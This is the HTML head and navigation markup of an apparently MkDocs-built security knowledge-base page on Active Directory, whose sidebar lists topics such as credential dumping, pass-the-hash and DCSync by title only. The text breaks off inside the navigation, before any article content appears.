



<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
      
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
    
    
      
        <title>Active Directory - Security Knowledge Base</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/application.1b62728e.css">
      
      
    
    
      <script src="../../../assets/javascripts/modernizr.268332fc.js"></script>
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../../../assets/fonts/material-icons.css">
    
    
      <link rel="stylesheet" href="../../../_site/extra.css">
    
    
      
    
    
  </head>
  
    <body dir="ltr">
  
    <svg class="md-svg">
      <defs>
        
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#active-directory" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="../../.." title="Security Knowledge Base" class="md-header-nav__button md-logo">
          
            <i class="md-icon"></i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            <span class="md-header-nav__topic">
              Security Knowledge Base
            </span>
            <span class="md-header-nav__topic">
              
                Active Directory
              
            </span>
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
          
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
        
      </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
      <main class="md-main" role="main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href="../../.." title="Security Knowledge Base" class="md-nav__button md-logo">
      
        <i class="md-icon"></i>
      
    </a>
    Security Knowledge Base
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href="../../.." title="Home" class="md-nav__link">
      Home
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../bug-hunting/" title="Bug hunting" class="md-nav__link">
      Bug hunting
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../career/" title="Career" class="md-nav__link">
      Career
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../collections/" title="Collections" class="md-nav__link">
      Collections
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../container/" title="Container" class="md-nav__link">
      Container
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../crypto/" title="Crypto" class="md-nav__link">
      Crypto
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../databases-sqlserver/" title="Databases sqlserver" class="md-nav__link">
      Databases sqlserver
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../databases/" title="Databases" class="md-nav__link">
      Databases
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../dfir/" title="Dfir" class="md-nav__link">
      Dfir
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../embedded-and-iot/" title="Embedded and iot" class="md-nav__link">
      Embedded and iot
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../exploits_and_shellcoding/" title="Exploits and shellcoding" class="md-nav__link">
      Exploits and shellcoding
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../languages/" title="Languages" class="md-nav__link">
      Languages
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../linux-issues/" title="Linux issues" class="md-nav__link">
      Linux issues
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../linux/" title="Linux" class="md-nav__link">
      Linux
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../malware/" title="Malware" class="md-nav__link">
      Malware
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../network/" title="Network" class="md-nav__link">
      Network
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../operating-systems/" title="Operating systems" class="md-nav__link">
      Operating systems
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../osint/" title="Osint" class="md-nav__link">
      Osint
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../password-attacks/" title="Password attacks" class="md-nav__link">
      Password attacks
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../reverse-engineering/" title="Reverse engineering" class="md-nav__link">
      Reverse engineering
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../rf-and-sdr/" title="Rf and sdr" class="md-nav__link">
      Rf and sdr
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../steganography/" title="Steganography" class="md-nav__link">
      Steganography
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../vulnerable/" title="Vulnerable" class="md-nav__link">
      Vulnerable
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../wifi/" title="Wifi" class="md-nav__link">
      Wifi
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../windows-active-directory/" title="Windows active directory" class="md-nav__link">
      Windows active directory
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../windows-issues/" title="Windows issues" class="md-nav__link">
      Windows issues
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../windows/" title="Windows" class="md-nav__link">
      Windows
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-29" type="checkbox" id="nav-29">
    
    <label class="md-nav__link" for="nav-29">
      Certifications
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-29">
        Certifications
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/cissp/" title="Cissp" class="md-nav__link">
      Cissp
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/osce/" title="Osce" class="md-nav__link">
      Osce
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-29-3" type="checkbox" id="nav-29-3">
    
    <label class="md-nav__link" for="nav-29-3">
      Oscp
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-29-3">
        Oscp
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/0-cheatsheet/" title="Enumeration" class="md-nav__link">
      Enumeration
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/_collections/" title="collections" class="md-nav__link">
       collections
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/_preparation/" title="Was checking" class="md-nav__link">
      Was checking
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/lab-setup/" title="Lab Setup" class="md-nav__link">
      Lab Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/notes/" title="Notes" class="md-nav__link">
      Notes
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/practice-vulnhub/" title="Practice" class="md-nav__link">
      Practice
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/setup/" title="Setup" class="md-nav__link">
      Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/y-Tools/" title="Tools" class="md-nav__link">
      Tools
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-29-3-9" type="checkbox" id="nav-29-3-9">
    
    <label class="md-nav__link" for="nav-29-3-9">
      Cheatsheet
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-29-3-9">
        Cheatsheet
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/cheatsheet/0-cheatsheet/" title="Cheatsheets" class="md-nav__link">
      Cheatsheets
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/cheatsheet/download/" title="Download" class="md-nav__link">
      Download
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/cheatsheet/exploits/" title="Exploits" class="md-nav__link">
      Exploits
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/cheatsheet/post-exploitation/" title="Post exploitation" class="md-nav__link">
      Post exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/cheatsheet/share-files/" title="Share files" class="md-nav__link">
      Share files
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/cheatsheet/shell/" title="Bash" class="md-nav__link">
      Bash
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/cheatsheet/tty/" title="TTY" class="md-nav__link">
      TTY
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/cheatsheet/web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/cheatsheet/windows/" title="Windows" class="md-nav__link">
      Windows
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-29-3-9-10" type="checkbox" id="nav-29-3-9-10">
    
    <label class="md-nav__link" for="nav-29-3-9-10">
      Enumeration
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-29-3-9-10">
        Enumeration
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/cheatsheet/enumeration/network/" title="Network" class="md-nav__link">
      Network
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/cheatsheet/enumeration/vulnerability/" title="Vulnerability" class="md-nav__link">
      Vulnerability
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/cheatsheet/enumeration/windows-local/" title="Windows local" class="md-nav__link">
      Windows local
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-30" type="checkbox" id="nav-30">
    
    <label class="md-nav__link" for="nav-30">
      Cloud
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-30">
        Cloud
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../cloud/aws/" title="Aws" class="md-nav__link">
      Aws
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../cloud/azuer/" title="Azuer" class="md-nav__link">
      Azuer
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-31" type="checkbox" id="nav-31">
    
    <label class="md-nav__link" for="nav-31">
      Identity and access management
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-31">
        Identity and access management
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../identity-and-access-management/jwt/" title="Jwt" class="md-nav__link">
      Jwt
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../identity-and-access-management/kerberos/" title="Kerberos" class="md-nav__link">
      Kerberos
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../identity-and-access-management/oauth2-and-oidc/" title="Oauth2 and oidc" class="md-nav__link">
      Oauth2 and oidc
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-32" type="checkbox" id="nav-32">
    
    <label class="md-nav__link" for="nav-32">
      Network
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-32">
        Network
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../network/port-forwarding-and-tunneling/" title="Port Forwarding" class="md-nav__link">
      Port Forwarding
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../network/traffic-analysis/" title="Traffic analysis" class="md-nav__link">
      Traffic analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../network/wireless/" title="Wireless" class="md-nav__link">
      Wireless
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../network/y-Tools/" title="y Tools" class="md-nav__link">
      y Tools
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-33" type="checkbox" id="nav-33" checked>
    
    <label class="md-nav__link" for="nav-33">
      Os
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-33">
        Os
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-33-1" type="checkbox" id="nav-33-1" checked>
    
    <label class="md-nav__link" for="nav-33-1">
      Windows
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-33-1">
        Windows
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../0-cheatsheed/" title="Cheatsheet" class="md-nav__link">
      Cheatsheet
    </a>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
      
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        Active Directory
      </label>
    
    <a href="./" title="Active Directory" class="md-nav__link md-nav__link--active">
      Active Directory
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#introduction" class="md-nav__link">
    Introduction
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#components" class="md-nav__link">
    Components
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ad-trust-types" class="md-nav__link">
    AD Trust Types
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#kerberos-process-across-trust-boundaries" class="md-nav__link">
    Kerberos Process Across Trust Boundaries
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#setup" class="md-nav__link">
    Setup
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#detect-firewall-blocking-ad" class="md-nav__link">
    Detect Firewall Blocking AD
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#implementing-least-privilege-model" class="md-nav__link">
    Implementing Least Privilege Model
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#attack-types" class="md-nav__link">
    Attack Types
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#scanning" class="md-nav__link">
    Scanning
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tools" class="md-nav__link">
    Tools
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#mimikatz" class="md-nav__link">
    Mimikatz
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#crackmapexec" class="md-nav__link">
    CrackMapExec
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ldapsearch" class="md-nav__link">
    ldapsearch
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#impackets-getaduserspy" class="md-nav__link">
    Impacket’s GetADUsers.py
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enumeration" class="md-nav__link">
    Enumeration
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#using-powershell-and-built-ins" class="md-nav__link">
    Using PowerShell and Built-ins
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powerview" class="md-nav__link">
    PowerView
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#snapshot-for-offline-analysis" class="md-nav__link">
    Snapshot for Offline Analysis
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bloodhound" class="md-nav__link">
    Bloodhound
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sysvol" class="md-nav__link">
    SYSVOL
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#collections" class="md-nav__link">
    Collections
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#attack-patterns" class="md-nav__link">
    Attack Patterns
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#dumping-ad-credentials" class="md-nav__link">
    Dumping AD Credentials
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#secretsdump" class="md-nav__link">
    secretsdump
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ntdsdit" class="md-nav__link">
    NTDS.dit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dumping-credentials-on-dc" class="md-nav__link">
    Dumping Credentials on DC
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pass-the-hash" class="md-nav__link">
    Pass the Hash
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#over-pass-the-hash-pass-the-key" class="md-nav__link">
    Over Pass the Hash / Pass the Key
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pass-the-ticket" class="md-nav__link">
    Pass the Ticket
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dcsyc" class="md-nav__link">
    DCSyc
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nrpc-netlogon" class="md-nav__link">
    NRPC (NetLogon)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    References
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#defense" class="md-nav__link">
    Defense
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#kb2871997" class="md-nav__link">
    KB2871997
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#microsoft-windows-ad-kerberos-tickets" class="md-nav__link">
    Microsoft Windows AD Kerberos Tickets
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dump" class="md-nav__link">
    Dump
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../api/" title="Windows API" class="md-nav__link">
      Windows API
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../applocker/" title="Applocker" class="md-nav__link">
      Applocker
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../events/" title="Events" class="md-nav__link">
      Events
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../hyperv/" title="HyperV" class="md-nav__link">
      HyperV
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../important-endpoints/" title="Important Endpoints" class="md-nav__link">
      Important Endpoints
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../important-files/" title="Important Files" class="md-nav__link">
      Important Files
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../important-issues/" title="Important issues" class="md-nav__link">
      Important issues
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../important-processes/" title="Important Processes" class="md-nav__link">
      Important Processes
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../important-reg-locations/" title="Important Registry Locations" class="md-nav__link">
      Important Registry Locations
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../kernel-exploitation/" title="Kernel Exploitation" class="md-nav__link">
      Kernel Exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../mix/" title="Mix" class="md-nav__link">
      Mix
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../post-exploitation/" title="Post exploitation" class="md-nav__link">
      Post exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../privilege-escalation/" title="Privilege Escalation" class="md-nav__link">
      Privilege Escalation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../user-accounts/" title="User accounts" class="md-nav__link">
      User accounts
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../wmi/" title="Wmi" class="md-nav__link">
      Wmi
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../x-Bypass/" title="Defense Bypass" class="md-nav__link">
      Defense Bypass
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../x-Defense/" title="Defense" class="md-nav__link">
      Defense
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../y-Tools/" title="Tools" class="md-nav__link">
      Tools
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../z-References/" title="References" class="md-nav__link">
      References
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-33-1-22" type="checkbox" id="nav-33-1-22">
    
    <label class="md-nav__link" for="nav-33-1-22">
      Credentials
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-33-1-22">
        Credentials
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../credentials/0-cheatsheed/" title="Cheatsheet" class="md-nav__link">
      Cheatsheet
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../credentials/using-credentials/" title="Using Credentials" class="md-nav__link">
      Using Credentials
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-33-1-23" type="checkbox" id="nav-33-1-23">
    
    <label class="md-nav__link" for="nav-33-1-23">
      Powershell
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-33-1-23">
        Powershell
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../powershell/0-cheatsheet/" title="Cheatsheet" class="md-nav__link">
      Cheatsheet
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../powershell/collections/" title="Collections" class="md-nav__link">
      Collections
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../powershell/modules/" title="Modules" class="md-nav__link">
      Modules
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../powershell/powershell/" title="Reverse Shell" class="md-nav__link">
      Reverse Shell
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../powershell/z-Resources/" title="Resources" class="md-nav__link">
      Resources
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-34" type="checkbox" id="nav-34">
    
    <label class="md-nav__link" for="nav-34">
      Protocols and ports
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-34">
        Protocols and ports
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/Citrix-1494/" title="Citrix 1494" class="md-nav__link">
      Citrix 1494
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/DHCP/" title="DHCP" class="md-nav__link">
      DHCP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/DNS-53/" title="DNS 53" class="md-nav__link">
      DNS 53
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/ElasticSearch-9200/" title="Interesting APIs" class="md-nav__link">
      Interesting APIs
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/FTP-21/" title="FTP 21" class="md-nav__link">
      FTP 21
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/Finger-79/" title="Finger 79" class="md-nav__link">
      Finger 79
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/HTTP-HTTPS-80,443/" title="HTTP HTTPS 80,443" class="md-nav__link">
      HTTP HTTPS 80,443
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/IMAP-143,993/" title="References" class="md-nav__link">
      References
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/IRC-8067/" title="IRC 8067" class="md-nav__link">
      IRC 8067
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/LDAP-389/" title="LDAP 389" class="md-nav__link">
      LDAP 389
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/Memcache/" title="Memcache" class="md-nav__link">
      Memcache
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/Modbus-502/" title="Modbus 502" class="md-nav__link">
      Modbus 502
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/MySQL-3306/" title="MySQL 3306" class="md-nav__link">
      MySQL 3306
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/NFS-2049/" title="NFS 2049" class="md-nav__link">
      NFS 2049
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/NTP-123/" title="NTP 123" class="md-nav__link">
      NTP 123
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/Oracle-1521/" title="References" class="md-nav__link">
      References
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
